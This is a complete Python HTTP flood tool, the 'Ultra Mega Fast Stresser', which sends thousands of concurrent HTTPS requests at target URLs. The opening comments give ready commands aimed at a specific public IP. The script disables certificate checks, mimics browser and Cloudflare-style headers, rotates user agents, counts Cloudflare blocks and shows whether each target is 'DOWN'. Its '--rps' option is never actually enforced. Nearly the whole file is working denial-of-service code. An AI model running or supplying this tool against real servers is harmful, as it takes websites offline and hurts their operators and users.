#python3 multi_stresser.py --target https://167.104.100.205/ --concurrency 1000 --duration 30 --rps 50000 --timeout 30
#python3 multi_stresser.py --target https://167.104.100.205/ --concurrency 2000 --duration 60 --rps 100000 --timeout 30
#!/usr/bin/env python3
"""
V3 ULTRA MEGA FAST SERVER STRESSER - FINAL
===========================================
FIXED: Console update - no more new lines!
ADDED: Site Status (LIVE/DOWN)
ADDED: Clean table format
Uses rich.live for smooth updates
"""

import argparse
import asyncio
import aiohttp
import ssl
import time
import random
import sys
import gc
import os
import signal
import json
from datetime import datetime
from typing import Optional, List, Dict, Any
from collections import defaultdict, deque
from dataclasses import dataclass, field
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich.align import Align

# ============================================
# VERSION AND CONFIGURATION
# ============================================

VERSION = "3.0.3"
DEFAULT_CONCURRENCY = 1000
DEFAULT_DURATION = 30
DEFAULT_RPS = 50000
DEFAULT_TIMEOUT = 30

# SSL Configuration
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

# Headers
CLOUDFLARE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "dnt": "1",
    "upgrade-insecure-requests": "1",
    "connection": "keep-alive",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
]

# ============================================
# DATA CLASSES
# ============================================

@dataclass
class RequestResult:
    status: int
    latency: float
    timestamp: float = field(default_factory=time.time)
    success: bool = False
    error: Optional[str] = None
    target_url: str = ""
    worker_id: int = 0
    
    def __post_init__(self):
        self.success = 200 <= self.status < 400 if self.status > 0 else False

@dataclass
class TargetStats:
    url: str = ""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    timeouts: int = 0
    cloudflare_blocks: int = 0
    total_latency: float = 0.0
    min_latency: float = float('inf')
    max_latency: float = 0.0
    latencies: deque = field(default_factory=lambda: deque(maxlen=10000))
    is_live: bool = False
    last_status: int = 0
    
    def add_result(self, result: RequestResult):
        self.total_requests += 1
        if result.success:
            self.successful += 1
            self.is_live = True
        else:
            self.failed += 1
            if result.status == 403:
                self.cloudflare_blocks += 1
            elif result.status == 0:
                self.timeouts += 1
        
        self.last_status = result.status
        
        if result.latency > 0:
            self.total_latency += result.latency
            self.min_latency = min(self.min_latency, result.latency)
            self.max_latency = max(self.max_latency, result.latency)
            self.latencies.append(result.latency)
    
    @property
    def avg_latency(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return self.total_latency / self.total_requests
    
    @property
    def success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def error_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.failed / self.total_requests) * 100
    
    @property
    def status_text(self) -> str:
        if self.total_requests == 0:
            return "⏳ WAITING"
        if self.is_live and self.success_rate > 80:
            return "🟢 LIVE"
        elif self.is_live and self.success_rate > 50:
            return "🟡 DEGRADED"
        elif self.cloudflare_blocks > 0:
            return "🔴 CLOUDFLARE"
        elif self.timeouts > 0:
            return "🔴 TIMEOUT"
        else:
            return "🔴 DOWN"
    
    def get_percentile(self, percentile: float) -> float:
        if not self.latencies:
            return 0.0
        sorted_lat = sorted(self.latencies)
        index = int(len(sorted_lat) * (percentile / 100))
        if index >= len(sorted_lat):
            index = len(sorted_lat) - 1
        return sorted_lat[index]

@dataclass
class GlobalStats:
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    timeouts: int = 0
    cloudflare_blocks: int = 0
    start_time: float = 0.0
    end_time: float = 0.0
    target_stats: Dict[str, TargetStats] = field(default_factory=dict)
    
    def add_result(self, result: RequestResult):
        self.total_requests += 1
        if result.success:
            self.successful += 1
        else:
            self.failed += 1
            if result.status == 403:
                self.cloudflare_blocks += 1
            elif result.status == 0:
                self.timeouts += 1
        
        if result.target_url not in self.target_stats:
            self.target_stats[result.target_url] = TargetStats(url=result.target_url)
        self.target_stats[result.target_url].add_result(result)
    
    @property
    def success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def error_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.failed / self.total_requests) * 100
    
    @property
    def elapsed(self) -> float:
        if self.end_time > 0:
            return self.end_time - self.start_time
        return time.time() - self.start_time
    
    @property
    def rps(self) -> float:
        elapsed = self.elapsed
        if elapsed == 0:
            return 0.0
        return self.total_requests / elapsed

# ============================================
# ULTRA FAST WORKER
# ============================================

class UltraFastWorker:
    __slots__ = ['session', 'url', 'worker_id', 'count', 'headers', 'timeout']
    
    def __init__(self, session: aiohttp.ClientSession, url: str, worker_id: int, timeout: int):
        self.session = session
        self.url = url
        self.worker_id = worker_id
        self.count = 0
        self.timeout = timeout
        self.headers = CLOUDFLARE_HEADERS.copy()
        self.headers["user-agent"] = random.choice(USER_AGENTS)
    
    async def fire(self) -> RequestResult:
        self.count += 1
        if self.count % 10 == 0:
            self.headers["user-agent"] = random.choice(USER_AGENTS)
        
        start = time.perf_counter()
        
        try:
            async with self.session.get(
                self.url,
                headers=self.headers,
                ssl=SSL_CONTEXT,
                timeout=aiohttp.ClientTimeout(total=self.timeout)
            ) as response:
                await response.read()
                return RequestResult(
                    status=response.status,
                    latency=time.perf_counter() - start,
                    target_url=self.url,
                    worker_id=self.worker_id
                )
        except asyncio.TimeoutError:
            return RequestResult(
                status=0,
                latency=time.perf_counter() - start,
                error="timeout",
                target_url=self.url,
                worker_id=self.worker_id
            )
        except Exception as e:
            return RequestResult(
                status=0,
                latency=time.perf_counter() - start,
                error=str(e),
                target_url=self.url,
                worker_id=self.worker_id
            )

# ============================================
# STRESSER ENGINE - WITH LIVE CONSOLE
# ============================================

class MegaStressEngine:
    def __init__(self, targets: List[str], concurrency: int, duration: int, rps: int, timeout: int):
        self.targets = targets
        self.concurrency = concurrency
        self.duration = duration
        self.rps_target = rps
        self.timeout = timeout
        self.stats = GlobalStats()
        self.running = False
        self.workers: List[asyncio.Task] = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.stop_event = asyncio.Event()
        self.console = Console()
        self.start_time = 0
        self.current_rps = 0
        self.last_total = 0
        self.last_time = 0
        
    def create_dashboard(self) -> Panel:
        """Create the dashboard panel - ONE SCREEN ONLY!"""
        elapsed = self.stats.elapsed
        total = self.stats.total_requests
        
        # Calculate RPS
        now = time.time()
        if self.last_time > 0 and self.last_total > 0:
            time_diff = now - self.last_time
            if time_diff > 0:
                self.current_rps = (total - self.last_total) / time_diff
        self.last_time = now
        self.last_total = total
        
        # Build content
        content = []
        
        # HEADER
        content.append(f"[bold red]⚡ ULTRA MEGA FAST STRESSER V{VERSION}[/bold red]")
        content.append(f"[white]Targets: {len(self.targets)} | Concurrency: {self.concurrency:,} | RPS Target: {self.rps_target:,} | Duration: {self.duration}s[/white]")
        content.append(f"[white]Elapsed: {elapsed:.1f}s | Total: {total:,} | Live RPS: [bold green]{self.current_rps:,.0f}[/bold green][/white]")
        content.append("")
        
        # METRICS TABLE
        success_rate = self.stats.success_rate
        color = "green" if success_rate > 80 else "yellow" if success_rate > 50 else "red"
        status_icon = "🟢" if success_rate > 80 else "🟡" if success_rate > 50 else "🔴"
        
        content.append(f"📊 SUCCESS RATE: {status_icon} [{color}]{success_rate:.1f}%[/{color}]")
        content.append(f"📦 TOTAL REQUESTS: {total:,}")
        content.append(f"✅ SUCCESSFUL: {self.stats.successful:,}")
        content.append(f"❌ FAILED: {self.stats.failed:,}")
        content.append(f"⏱️ TIMEOUTS: {self.stats.timeouts:,}")
        
        if self.stats.cloudflare_blocks > 0:
            content.append(f"🛡️ CLOUDFLARE: [red]{self.stats.cloudflare_blocks:,}[/red]")
        
        content.append("")
        
        # LATENCY METRICS
        all_latencies = []
        for target_stats in self.stats.target_stats.values():
            all_latencies.extend(target_stats.latencies)
        
        if all_latencies:
            sorted_lat = sorted(all_latencies)
            p95 = sorted_lat[int(len(sorted_lat) * 0.95)] if sorted_lat else 0
            p99 = sorted_lat[int(len(sorted_lat) * 0.99)] if sorted_lat else 0
            avg_lat = sum(all_latencies) / len(all_latencies) if all_latencies else 0
            min_lat = min(all_latencies) if all_latencies else 0
            max_lat = max(all_latencies) if all_latencies else 0
            
            content.append("⏱️ LATENCY METRICS:")
            content.append(f"   P95: {p95:.4f}s | P99: {p99:.4f}s")
            content.append(f"   AVG: {avg_lat:.4f}s | MIN: {min_lat:.4f}s | MAX: {max_lat:.4f}s")
            content.append("")
        
        # PER-TARGET TABLE WITH STATUS
        if self.stats.target_stats:
            content.append("🎯 PER-TARGET STATISTICS:")
            content.append("┌─────────────────────┬──────────┬──────────┬──────────┬──────────┬────────────┐")
            content.append("│ TARGET               │ REQUESTS │ SUCCESS  │ ERROR    │ P95      │ STATUS     │")
            content.append("├─────────────────────┼──────────┼──────────┼──────────┼──────────┼────────────┤")
            
            for url, stats in self.stats.target_stats.items():
                short_url = url.replace("https://", "").replace("http://", "")[:20]
                rate = stats.success_rate
                color = "green" if rate > 80 else "yellow" if rate > 50 else "red"
                
                # Status with color
                status_text = stats.status_text
                if "LIVE" in status_text:
                    status_color = "green"
                elif "DEGRADED" in status_text:
                    status_color = "yellow"
                elif "CLOUDFLARE" in status_text:
                    status_color = "red"
                elif "TIMEOUT" in status_text:
                    status_color = "red"
                elif "DOWN" in status_text:
                    status_color = "red"
                else:
                    status_color = "white"
                
                content.append(
                    f"│ {short_url:<19} │ {stats.total_requests:>8} │ [{color}]{stats.success_rate:>6.1f}%[/{color}] │ [red]{stats.error_rate:>6.1f}%[/red] │ {stats.get_percentile(95):>8.3f}s │ [{status_color}]{status_text:>10}[/{status_color}] │"
                )
            content.append("└─────────────────────┴──────────┴──────────┴──────────┴──────────┴────────────┘")
            content.append("")
        
        # PROGRESS BAR
        progress = min(elapsed / self.duration, 1.0) if self.duration > 0 else 0
        bar_len = 50
        filled = int(bar_len * progress)
        bar = "█" * filled + "░" * (bar_len - filled)
        content.append(f"[bold yellow]⚡ {bar} {progress*100:.0f}%[/bold yellow]")
        
        # STATUS
        if self.running:
            content.append("[bold green]▶ STRESSING... Press Ctrl+C to stop[/bold green]")
        else:
            content.append("[bold red]⏹ COMPLETE[/bold red]")
        
        # Return as Panel
        return Panel("\n".join(content), border_style="red")
    
    async def start(self):
        """Start the stress test with Live console"""
        self.start_time = time.time()
        self.stats.start_time = self.start_time
        self.running = True
        
        # Setup session
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            enable_cleanup_closed=True,
            ssl=SSL_CONTEXT,
            force_close=False,
            ttl_dns_cache=300,
            keepalive_timeout=30,
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            headers=CLOUDFLARE_HEADERS,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        )
        
        # Create workers
        for target in self.targets:
            for i in range(self.concurrency):
                worker = UltraFastWorker(self.session, target, i, self.timeout)
                task = asyncio.create_task(self._worker_loop(worker, self.stop_event))
                self.workers.append(task)
        
        # Start monitor with Live
        try:
            with Live(self.create_dashboard(), refresh_per_second=10, screen=True) as live:
                while not self.stop_event.is_set() and time.time() - self.start_time < self.duration:
                    live.update(self.create_dashboard())
                    await asyncio.sleep(0.05)
                
                self.running = False
                live.update(self.create_dashboard())
                await asyncio.sleep(0.5)
                
        finally:
            self.stop_event.set()
            await asyncio.sleep(0.5)
            
            for worker in self.workers:
                worker.cancel()
            await asyncio.gather(*self.workers, return_exceptions=True)
            
            if self.session:
                await self.session.close()
            
            self.stats.end_time = time.time()
    
    async def _worker_loop(self, worker: UltraFastWorker, stop_event: asyncio.Event):
        while not stop_event.is_set():
            result = await worker.fire()
            self.stats.add_result(result)
    
    def generate_report(self) -> str:
        report = []
        report.append("=" * 80)
        report.append(f"ULTRA MEGA FAST STRESSER V{VERSION} - FINAL REPORT")
        report.append("=" * 80)
        report.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("")
        report.append(f"Targets: {len(self.targets)}")
        report.append(f"Concurrency: {self.concurrency:,}")
        report.append(f"Duration: {self.duration}s")
        report.append(f"RPS Target: {self.rps_target:,}")
        report.append(f"Timeout: {self.timeout}s")
        report.append("")
        report.append("-" * 40)
        report.append("GLOBAL STATISTICS")
        report.append("-" * 40)
        report.append(f"Total Requests: {self.stats.total_requests:,}")
        report.append(f"Successful: {self.stats.successful:,} ({self.stats.success_rate:.1f}%)")
        report.append(f"Failed: {self.stats.failed:,} ({self.stats.error_rate:.1f}%)")
        report.append(f"Timeouts: {self.stats.timeouts:,}")
        report.append(f"Cloudflare Blocks: {self.stats.cloudflare_blocks:,}")
        report.append(f"Average RPS: {self.stats.rps:.2f}")
        report.append(f"Elapsed: {self.stats.elapsed:.1f}s")
        report.append("")
        
        report.append("-" * 40)
        report.append("PER-TARGET STATISTICS")
        report.append("-" * 40)
        
        for url, stats in self.stats.target_stats.items():
            report.append(f"\nTarget: {url}")
            report.append(f"  Status: {stats.status_text}")
            report.append(f"  Requests: {stats.total_requests:,}")
            report.append(f"  Success Rate: {stats.success_rate:.1f}%")
            report.append(f"  RPS: {stats.total_requests / self.stats.elapsed:.2f}")
            report.append(f"  P95: {stats.get_percentile(95):.4f}s")
            report.append(f"  P99: {stats.get_percentile(99):.4f}s")
            report.append(f"  Avg Latency: {stats.avg_latency:.4f}s")
        
        report.append("")
        report.append("=" * 80)
        report.append("END OF REPORT")
        report.append("=" * 80)
        return "\n".join(report)
    
    async def save_report(self, filename: str = "stress_report.txt"):
        with open(filename, "w", encoding="utf-8") as f:
            f.write(self.generate_report())
        self.console.print(f"[green]✅ Report saved to {filename}[/green]")
    
    async def save_json(self, filename: str = "stress_data.json"):
        data = {
            "version": VERSION,
            "timestamp": datetime.now().isoformat(),
            "config": {
                "targets": self.targets,
                "concurrency": self.concurrency,
                "duration": self.duration,
                "rps_target": self.rps_target,
                "timeout": self.timeout,
            },
            "global": {
                "total_requests": self.stats.total_requests,
                "successful": self.stats.successful,
                "failed": self.stats.failed,
                "timeouts": self.stats.timeouts,
                "cloudflare_blocks": self.stats.cloudflare_blocks,
                "success_rate": self.stats.success_rate,
                "error_rate": self.stats.error_rate,
                "rps": self.stats.rps,
                "elapsed": self.stats.elapsed,
            },
            "targets": {}
        }
        
        for url, stats in self.stats.target_stats.items():
            data["targets"][url] = {
                "status": stats.status_text,
                "total_requests": stats.total_requests,
                "successful": stats.successful,
                "failed": stats.failed,
                "timeouts": stats.timeouts,
                "cloudflare_blocks": stats.cloudflare_blocks,
                "success_rate": stats.success_rate,
                "error_rate": stats.error_rate,
                "avg_latency": stats.avg_latency,
                "min_latency": stats.min_latency,
                "max_latency": stats.max_latency,
                "p50": stats.get_percentile(50),
                "p75": stats.get_percentile(75),
                "p90": stats.get_percentile(90),
                "p95": stats.get_percentile(95),
                "p99": stats.get_percentile(99),
            }
        
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        self.console.print(f"[green]✅ JSON saved to {filename}[/green]")

# ============================================
# COMMAND LINE
# ============================================

def parse_args():
    parser = argparse.ArgumentParser(description="Ultra Mega Fast Stresser")
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--target", help="Single target URL")
    target_group.add_argument("--targets", nargs="+", help="Multiple target URLs")
    
    parser.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION)
    parser.add_argument("--rps", type=int, default=DEFAULT_RPS)
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--save-report", action="store_true")
    parser.add_argument("--save-json", action="store_true")
    parser.add_argument("--report-file", default="stress_report.txt")
    parser.add_argument("--json-file", default="stress_data.json")
    
    return parser.parse_args()

# ============================================
# MAIN
# ============================================

async def main_async():
    args = parse_args()
    console = Console()
    
    targets = [args.target] if args.target else args.targets
    valid_targets = []
    for t in targets:
        t = t.strip()
        if t:
            if not t.startswith(("http://", "https://")):
                t = "https://" + t
            valid_targets.append(t)
    
    if not valid_targets:
        console.print("[red]❌ No valid targets![/red]")
        return
    
    console.print(Panel.fit(
        f"[bold red]⚡ ULTRA MEGA FAST STRESSER V{VERSION}[/bold red]\n"
        f"[white]Targets: {len(valid_targets)} | Concurrency: {args.concurrency:,} | RPS: {args.rps:,} | Duration: {args.duration}s[/white]",
        border_style="red"
    ))
    
    engine = MegaStressEngine(
        targets=valid_targets,
        concurrency=args.concurrency,
        duration=args.duration,
        rps=args.rps,
        timeout=args.timeout,
    )
    
    def signal_handler(sig, frame):
        engine.stop_event.set()
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        await engine.start()
        
        console.print("\n[bold green]✅ STRESS TEST COMPLETE![/bold green]")
        
        if args.save_report:
            await engine.save_report(args.report_file)
        if args.save_json:
            await engine.save_json(args.json_file)
        
        console.print(Panel.fit(
            engine.generate_report(),
            title="📊 FINAL REPORT",
            border_style="green"
        ))
        
    except Exception as e:
        console.print(f"\n[bold red]❌ Error: {e}[/bold red]")

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        console = Console()
        console.print("\n[yellow]⚠️ Stopped by user.[/yellow]")
        sys.exit(0)

if __name__ == "__main__":
    main()